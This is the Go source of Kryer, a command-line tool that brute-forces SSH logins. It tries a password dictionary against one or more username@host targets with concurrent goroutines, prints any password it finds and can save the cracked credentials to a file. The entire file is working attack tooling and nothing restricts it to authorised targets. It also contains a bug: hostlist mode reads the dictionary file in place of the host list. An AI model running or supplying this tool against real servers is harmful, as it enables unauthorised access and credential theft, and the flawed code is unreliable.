package main

import (
	"bufio"
	"context"
	"errors"
	"flag"
	"fmt"
	"net"
	"os"
	"strings"

	"github.com/cfschilham/kryer/pkg/sshatk"
	"github.com/fatih/color"
)

const version = "v1.3.0"

var args = struct {
	host,
	hostlistPath,
	dictPath,
	port,
	outputPath *string
	usrIsHost     *bool
	numGoroutines *int
	version       *bool
}{
	host:          flag.String("h", "", ""),
	hostlistPath:  flag.String("H", "", ""),
	dictPath:      flag.String("d", "", ""),
	port:          flag.String("p", "22", ""),
	usrIsHost:     flag.Bool("u", false, ""),
	numGoroutines: flag.Int("t", 1, ""),
	outputPath:    flag.String("o", "", ""),
	version:       flag.Bool("v", false, ""),
}

func argHelp() {
	fmt.Printf(`
Usage: kryer [-h or -H] [dictionary] [arguments]

Parameters:
	-h: The host which will be targeted. Ignored if the hostlist option is set.
	-H: Hostlist file path. Settings this option will also enable the use of hostlist mode.
	-d: Dictionary file path.
	-p: Remote port. Defaults to 22 if unset.
	-o: Output file path. If set, will output all found credentials to the specified file.
	-u: Username is host. When enabled, the address will be derived from the username + .local.
	-t: Maximum amount of concurrent outgoing connection attempts. Defaults to 1 if unset.
	-v: Prints the installed version of Kryer.

`,
	)
}

func printfInfo(format string, a ...interface{}) {
	c := color.New(color.FgHiBlue)
	c.Printf("[Info] ")
	fmt.Printf(format, a...)
}

func printfError(format string, a ...interface{}) {
	c := color.New(color.FgHiRed)
	c.Printf("[Error] "+format, a...)
}

func printfWarn(format string, a ...interface{}) {
	c := color.New(color.FgHiYellow)
	c.Printf("[Warning] "+format, a...)
}

func printfSuccess(format string, a ...interface{}) {
	c := color.New(color.FgGreen)
	c.Printf("[Success] "+format, a...)
}

// fatalf is a call to printfError followed by a call to os.Exit
func fatalf(format string, a ...interface{}) {
	printfError(format, a...)
	os.Exit(1)
}

type host struct {
	username,
	addr string
}

// ResolveAddr tries to resolve the address using the cgo resolver.
func (h host) resolveAddr() (string, error) {
	resolver := net.Resolver{
		PreferGo: false,
	}

	addrs, err := resolver.LookupHost(context.Background(), h.addr)
	var ips []net.IP
	for _, addr := range addrs {
		ips = append(ips, net.ParseIP(addr))
	}

	if err != nil {
		return "", err
	}

	for _, ip := range ips {
		if ip.To4() != nil {
			return ip.To4().String(), nil
		}
	}
	return "", fmt.Errorf("failed to resolve host: '%s'", h.addr)
}

// fileToSlice opens the file a the passed path and returns a slice with an
// entry for every line of that file.
func fileToSlice(path string) ([]string, error) {
	f, err := os.Open(path)
	if err != nil {
		return nil, err
	}
	defer f.Close()

	var line []string
	sc := bufio.NewScanner(f)
	for sc.Scan() {
		line = append(line, sc.Text())
	}
	if sc.Err() != nil {
		return nil, sc.Err()
	}

	return line, nil
}

// strToHost takes a string in the form username@addr and returns a host type.
func strToHost(str string) (host, error) {
	split := strings.SplitN(str, "@", 2)
	if len(split) != 2 {
		return host{}, errors.New("invalid host: " + str)
	}
	return host{
		username: split[0],
		addr:     split[1],
	}, nil
}

func usrIsHost(str string) string {
	return str + "@" + str + ".local"
}

// writeToFile writes the passed string to the file at the given path. Creates
// the file if it does not exist yet.
func writeToFile(str, path string) error {
	_, err := os.Stat(path)
	if os.IsNotExist(err) {
		os.Create(path)
	}

	f, err := os.OpenFile(path, os.O_RDWR, 0644)
	if err != nil {
		return err
	}
	defer f.Close()

	info, err := f.Stat()
	if err != nil {
		return err
	}

	if _, err := f.WriteAt([]byte(str), info.Size()); err != nil {
		return err
	}
	return nil
}

func main() {
	flag.Usage = argHelp
	flag.Parse()
	// Validate arguments.
	if *args.version {
		fmt.Printf(version + "\n")
		os.Exit(0)
	}
	if *args.host == "" && *args.hostlistPath == "" {
		argHelp()
		fatalf("main: invalid argument(s): please specify a host or hostlist\n")
	}
	if *args.dictPath == "" {
		argHelp()
		fatalf("main: invalid argument(s): please specify a dictionary\n")
	}
	if *args.numGoroutines < 1 {
		argHelp()
		fatalf("main: invalid argument(s): number of threads can't be lower than 1")
	}
	if *args.numGoroutines > 20 {
		printfWarn("setting a high number of maximum concurrent connections might cause instability such as skipped dictionary entries\n")
	}

	// Load dictionary.
	dict, err := fileToSlice(*args.dictPath)
	if err != nil {
		fatalf("main: unable to load dictionary: %s\n", err.Error())
	}

	// Load host(s) in the form username@address from command-line flags or file.
	var hostStrs []string
	if *args.hostlistPath == "" {
		hostStrs = append(hostStrs, *args.host)
	} else {
		hostStrs, err = fileToSlice(*args.dictPath)
		if err != nil {
			fatalf("main: unable to load hostlist file: %s\n", err.Error())
		}
	}

	// Convert host(s) in the form username@address to host types.
	var hosts []host
	for _, hostStr := range hostStrs {
		if *args.usrIsHost {
			hostStr = usrIsHost(hostStr)
		}
		host, err := strToHost(hostStr)
		if err != nil {
			fatalf("main: unable to parse host: %s\n", err.Error())
		}
		hosts = append(hosts, host)
	}

	fmt.Printf("Kryer %s - https://github.com/cfschilham/kryer\n", version)

	// Loop through hosts and attempt to authenticate
	for _, host := range hosts {
		printfInfo("Attempting to connect to %s@%s\n", host.username, host.addr)

		ip, err := host.resolveAddr()
		if err != nil {
			printfError("main: unable to resolve address\n")
			continue
		}

		pwd, err := sshatk.Dict(sshatk.Options{
			Addr:       ip,
			Port:       *args.port,
			Username:   host.username,
			Pwds:       dict,
			Goroutines: *args.numGoroutines,
		})
		if err != nil {
			printfError("main: %s\n", err.Error())
			continue
		}

		printfSuccess("Password of %s@%s found: %s\n", host.username, host.addr, pwd)
		if *args.outputPath != "" {
			writeToFile(fmt.Sprintf("%s@%s:%s\n", host.username, host.addr, pwd), *args.outputPath)
		}
	}
}
